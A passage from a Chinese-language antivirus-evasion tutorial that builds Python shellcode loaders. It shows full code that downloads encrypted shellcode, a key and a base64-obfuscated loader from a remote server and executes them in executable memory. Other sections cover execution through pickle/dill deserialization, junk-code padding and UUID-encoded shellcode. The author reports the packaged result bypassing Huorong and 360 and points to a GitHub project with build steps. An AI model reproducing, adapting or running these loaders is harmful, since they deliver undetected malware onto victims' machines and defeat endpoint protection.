</code></pre></div>

<p>3、pyhon3 执行代码。</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">version_info</span>
<span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
    <span class="kn">from</span> <span class="nn">urllib.request</span> <span class="kn">import</span> <span class="n">urlopen</span>
<span class="k">else</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">urllib2</span> <span class="kn">import</span> <span class="n">urlopen</span>


<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="c1"># 设置随机数</span>
    <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="c1"># 异或解密</span>
    <span class="n">xor_code</span> <span class="o">=</span> <span class="n">code</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
    <span class="n">res_code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xor_code</span><span class="p">:</span>
        <span class="n">res_code</span> <span class="o">=</span> <span class="n">res_code</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">))</span>
    <span class="c1"># 三重解码</span>
    <span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">res_code</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">res_code</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b16decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b32decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">shellcode</span>


<span class="k">def</span> <span class="nf">runcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
    <span class="n">loader</span> <span class="o">=</span> <span class="s2">&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZT1jdHlwZXMuY191aW50NjQ7cnd4cGFnZT1jdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYygwLCBsZW4oc2hlbGxjb2RlKSwgMHgxMDAwLCAweDQwKTtjdHlwZXMud2luZGxsLmtlcm5lbDMyLlJ0bE1vdmVNZW1vcnkoY3R5cGVzLmNfdWludDY0KHJ3eHBhZ2UpLCBjdHlwZXMuY3JlYXRlX3N0cmluZ19idWZmZXIoc2hlbGxjb2RlKSwgbGVuKHNoZWxsY29kZSkpO2hhbmRsZT1jdHlwZXMud2luZGxsLmtlcm5lbDMyLkNyZWF0ZVRocmVhZCgwLCAwLCBjdHlwZXMuY191aW50NjQocnd4cGFnZSksIDAsIDAsIDApO2N0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChoYW5kbGUsIC0xKQ==&quot;</span>
    <span class="n">exec</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">loader</span><span class="p">))</span>

<span class="k">class</span> <span class="nc">Runcode</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sc</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
        <span class="k">global</span> <span class="n">shellcode</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">sc</span>

    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">http</span> <span class="o">=</span> <span class="n">urllib3</span><span class="o">.</span><span class="n">PoolManager</span><span class="p">()</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;http://192.168.2.131/code2.txt&#39;</span><span class="p">)</span>
        <span class="n">code</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
        <span class="n">code</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="p">(</span><span class="n">code</span><span class="p">,))</span>



<span class="k">def</span> <span class="nf">get_data</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">,</span> <span class="n">url_key</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;远程获取shellcode&quot;&quot;&quot;</span>
    <span class="c1"># 远程加载shellcode, key</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">urlopen</span><span class="p">(</span><span class="n">url_key</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">urlopen</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">url_shellcode</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.2.131/shellcode.txt&quot;</span>
    <span class="n">url_key</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.2.131/key.txt&quot;</span>
    <span class="c1"># 远程加载</span>
    <span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span> <span class="o">=</span> <span class="n">get_data</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">,</span> <span class="n">url_key</span><span class="p">)</span>
    <span class="c1"># 解码</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
    <span class="c1"># 加载shellcode</span>
    <span class="n">runcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</code></pre></div>

<p><a name="knaWG"></a></p>
<h2>反序列化远程加载</h2>
<blockquote>
<p>思路：有趣的pickle库，把shellcode执行代码保存到txt中，然后利用反序列化执行文件中的代码。</p>
</blockquote>
<p>1、手动将混淆后的loader代码保存到 loader.txt中：<br /><img alt="image.png" src="images/1681459181714/1681459183877_6.png"><br /><img alt="image.png" src="images/1681459181714/1681459184217_7.png"><br />2、python3 反序列化加载：</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">version_info</span>
<span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
    <span class="kn">from</span> <span class="nn">urllib.request</span> <span class="kn">import</span> <span class="n">urlopen</span>
<span class="k">else</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">urllib2</span> <span class="kn">import</span> <span class="n">urlopen</span>


<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="c1"># 设置随机数</span>
    <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="c1"># 异或解密</span>
    <span class="n">xor_code</span> <span class="o">=</span> <span class="n">code</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
    <span class="n">res_code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xor_code</span><span class="p">:</span>
        <span class="n">res_code</span> <span class="o">=</span> <span class="n">res_code</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">))</span>
    <span class="c1"># 三重解码</span>
    <span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">res_code</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">res_code</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b16decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b32decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">shellcode</span>


<span class="k">class</span> <span class="nc">Runcode</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="n">ld</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">shellcode</span>
        <span class="k">global</span> <span class="n">loader</span>
        <span class="n">loader</span> <span class="o">=</span> <span class="n">ld</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">sc</span>

    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="p">(</span><span class="n">loader</span><span class="p">,))</span>


<span class="k">def</span> <span class="nf">get_data</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">,</span> <span class="n">url_key</span><span class="p">,</span> <span class="n">url_loader</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;远程获取shellcode&quot;&quot;&quot;</span>
    <span class="c1"># 远程加载shellcode, key</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">urlopen</span><span class="p">(</span><span class="n">url_key</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">urlopen</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">loader</span> <span class="o">=</span> <span class="n">urlopen</span><span class="p">(</span><span class="n">url_loader</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">loader</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">loader</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">loader</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">url_shellcode</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.2.131/shellcode.txt&quot;</span>
    <span class="n">url_key</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.2.131/key.txt&quot;</span>
    <span class="n">url_loader</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.2.131/loader.txt&quot;</span>
    <span class="c1"># 远程加载</span>
    <span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">get_data</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">,</span> <span class="n">url_key</span><span class="p">,</span> <span class="n">url_loader</span><span class="p">)</span>
    <span class="c1"># 解码</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
    <span class="c1"># 加载shellcode</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Runcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">loader</span><span class="p">))</span>
    <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</code></pre></div>

<p>python2 反序列化加载：</p>
<blockquote>
<p>注意：在python2中没办法使用反序列化调用exec，不过可以用execfile代替。因为pickle没办法传入内置类，可以改用dill：<code>pip install dill</code></p>
</blockquote>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">dill</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">version_info</span>
<span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
    <span class="kn">from</span> <span class="nn">urllib.request</span> <span class="kn">import</span> <span class="n">urlopen</span>
<span class="k">else</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">urllib2</span> <span class="kn">import</span> <span class="n">urlopen</span>


<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="c1"># 设置随机数</span>
    <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="c1"># 异或解密</span>
    <span class="n">xor_code</span> <span class="o">=</span> <span class="n">code</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
    <span class="n">res_code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xor_code</span><span class="p">:</span>
        <span class="n">res_code</span> <span class="o">=</span> <span class="n">res_code</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">))</span>
    <span class="c1"># 三重解码</span>
    <span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">res_code</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">res_code</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b16decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b32decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">shellcode</span>


<span class="k">class</span> <span class="nc">Runcode</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="n">ld</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">shellcode</span>
        <span class="k">global</span> <span class="n">loader</span>
        <span class="n">loader</span> <span class="o">=</span> <span class="n">ld</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">sc</span>

    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;execfile.ini&quot;</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">loader</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">execfile</span> <span class="p">,</span> <span class="p">(</span><span class="s1">&#39;execfile.ini&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;shellcode&#39;</span><span class="p">:</span><span class="n">shellcode</span><span class="p">,</span> <span class="s1">&#39;ctypes&#39;</span><span class="p">:</span><span class="n">ctypes</span><span class="p">}))</span>


<span class="k">def</span> <span class="nf">get_data</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">,</span> <span class="n">url_key</span><span class="p">,</span> <span class="n">url_loader</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;远程获取shellcode&quot;&quot;&quot;</span>
    <span class="c1"># 远程加载shellcode, key</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">urlopen</span><span class="p">(</span><span class="n">url_key</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">urlopen</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">loader</span> <span class="o">=</span> <span class="n">urlopen</span><span class="p">(</span><span class="n">url_loader</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">loader</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">loader</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">loader</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">url_shellcode</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.2.131/shellcode.txt&quot;</span>
    <span class="n">url_key</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.2.131/key.txt&quot;</span>
    <span class="n">url_loader</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.2.131/loader.txt&quot;</span>
    <span class="c1"># 远程加载</span>
    <span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">get_data</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">,</span> <span class="n">url_key</span><span class="p">,</span> <span class="n">url_loader</span><span class="p">)</span>
    <span class="c1"># 解码</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
    <span class="c1"># 加载shellcode</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">dill</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Runcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">loader</span><span class="p">))</span>
    <span class="n">dill</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</code></pre></div>

<p><a name="PnWoV"></a></p>
<h2>免杀实例</h2>
<blockquote>
<p>免杀思路：结合上面的部分知识点打一个组合拳，采用 base64 + hex + RC4 将shellcode混淆，然后将shellcode、key、loader三个部分分离，最后使用远程加载的方式来执行。
测试时间：2022.12.16
项目地址：<a href="https://github.com/jammny/Jbypass">https://github.com/jammny/Jbypass</a></p>
</blockquote>
<p>1、先在<code>encrypt.py</code>文件中，替换你的shellcode：<br /><img alt="image.png" src="images/1681459181714/1681459184496_8.png"><br />2、然后生成混淆文件，并开启http服务：<code>python2 encrypt.py</code><br /><img alt="image.png" src="images/1681459181714/1681459184822_9.png"><br />3、替换<code>Jbypass.py</code>文件中的地址：<br /><img alt="image.png" src="images/1681459181714/1681459185183_10.png"><br />4、python2打包：<code>pyinstaller.exe -F -w .\Jbypass.py</code><br />5、火绒静态和动态测试：显然火绒无压力。<br /><img alt="image.png" src="images/1681459181714/1681459185476_11.png"><br /><img alt="image.png" src="images/1681459181714/1681459185739_12.png"><br />6、360杀毒（全引擎），静态和动态测试：显然360也无压力。<br /><img alt="image.png" src="images/1681459181714/1681459186126_13.png"><br /><img alt="image.png" src="images/1681459181714/1681459186537_14.png"><br />7、Windows Defender 静态和动态测试：静态无压力，可以正常上线，但是执行shell命令被杀。<br /><img alt="image.png" src="images/1681459181714/1681459186900_15.png"><br /><img alt="image.png" src="images/1681459181714/1681459187329_16.png"><br /><img alt="image.png" src="images/1681459181714/1681459187682_17.png">
<a name="OfmUA"></a></p>
<h1>动态免杀</h1>
<p><a name="GJK8k"></a></p>
<h2>花指令免杀</h2>
<blockquote>
<p>思路：花指令主要是用来扰乱动态扫描的，向程序shellcode或特征代码区域增添垃圾指令。加花的原理就是通过添加花指令（一些垃圾加密数据，无意义的条件判断等等）干扰杀毒软件正常的检测。</p>
</blockquote>
<p>1、随意添加，exec执行即可。不知道是不是操作问题，加入花指令也没办法绕过WD。</p>
<div class="highlight"><pre><span></span><code><span class="n">junk_code1</span> <span class="o">=</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">import random</span>
<span class="s2">def partition(test_arr, low, high):</span>
<span class="s2">   i = (low - 1)  </span>
<span class="s2">   pivot = test_arr[high]</span>
<span class="s2">   for j in range(low, high):</span>
<span class="s2">       if test_arr[j] &lt;= pivot:</span>
<span class="s2">           i = i + 1</span>
<span class="s2">           test_arr[i], test_arr[j] = test_arr[j], test_arr[i]</span>
<span class="s2">   test_arr[i + 1], test_arr[high] = test_arr[high], test_arr[i + 1]</span>
<span class="s2">   return i + 1</span>
<span class="s2">def quick_sort(test_arr, low, high):</span>
<span class="s2">   if low &lt; high:</span>
<span class="s2">       pi = partition(test_arr, low, high)</span>
<span class="s2">       quick_sort(test_arr, low, pi - 1)</span>
<span class="s2">       quick_sort(test_arr, pi + 1, high)</span>
<span class="s2">test_arr= []</span>
<span class="s2">for i in range(59999):</span>
<span class="s2">   test_arr.append(random.random())</span>
<span class="s2">n= len(test_arr)</span>
<span class="s2">quick_sort(test_arr,0, n - 1)</span>
<span class="s2">&quot;&quot;&quot;</span>

<span class="n">junk_code2</span> <span class="o">=</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">import re</span>
<span class="s2">re.search(&#39;www&#39;,&#39;www.runoob.com&#39;).span()</span>
<span class="s2">re.search(&#39;com&#39;,&#39;www.runoob.com&#39;).span()</span>
<span class="s2">line= &quot;Cats are smarter than dogs ok in shakdhaksdas&quot;;</span>
<span class="s2">searchObj= re.search(r&#39;(.*) are (.*?) .*&#39;, line, re.M | re.I)</span>
<span class="s2">def double(matched):</span>
<span class="s2">   value = int(matched.group(&#39;value&#39;))</span>
<span class="s2">   return str(value * 2)</span>
<span class="s2">s= &#39;A23G4HFD567&#39;</span>
<span class="s2">re.sub(&#39;(?P&lt;value&gt;\d+)&#39;,double, s)</span>
<span class="s2">&quot;&quot;&quot;</span>

<span class="n">junk_code3</span> <span class="o">=</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">import base64</span>
<span class="s2">st= &#39;wo gan jue wo ma shang jiu yao bei defender gan diao a ba a bachonogchong chongcong!&#39;.encode()</span>
<span class="s2">res= base64.b64encode(st)</span>
<span class="s2">aaa= res.decode()</span>
<span class="s2">res= base64.b64decode(res)</span>
<span class="s2">bbb= res.decode()</span>
<span class="s2">&quot;&quot;&quot;</span>
</code></pre></div>

<p><a name="GFtAJ"></a></p>
<h2>uuid实现内存加载</h2>
<blockquote>
<p>思路：像之前介绍的方法本质上都是静态的特征码免杀技术。最后都是通过开辟一块内存,然后直接将shellcode写入到对应的内存中并且该内存是可读可写可执行的状态, 那么这种方式太容易被AV所查杀。如果是利用Windows自身提供的API来将加密或者封装好的shellcode写入到内存执行的话,将会大大增加查杀的难度。</p>
</blockquote>
<p>1、uuid官方介绍：<a href="https://docs.python.org/zh-cn/3/library/uuid.html">https://docs.python.org/zh-cn/3/library/uuid.html</a><br /><img alt="image.png" src="images/1681459181714/1681459187899_18.png"><br />2、生成uuid shellcode</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">uuid</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\&quot;</span>

<span class="c1"># 如果不能被16整除，就补充剩余的字节</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">replenish_byte</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">replenish_byte</span> 

<span class="c1"># 字节转uuid</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">//</span> <span class="mi">16</span><span class="p">):</span>
    <span class="n">bytes_a</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">16</span><span class="p">:</span><span class="mi">16</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">16</span><span class="p">]</span>
    <span class="n">b</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">UUID</span><span class="p">(</span><span class="n">bytes_le</span><span class="o">=</span><span class="n">bytes_a</span><span class="p">)</span>
    <span class="n">shellcode</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</code></pre></div>

<p>3、使用python2编译：</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;e48348fc-e8f0-00c8-0000-415141505251&#39;</span><span class="p">,</span> <span class="s1">&#39;d2314856-4865-528b-6048-8b5218488b52&#39;</span><span class="p">,</span> <span class="o">...</span><span class="p">]</span>

<span class="n">rwxpage</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">*</span> <span class="mi">16</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>

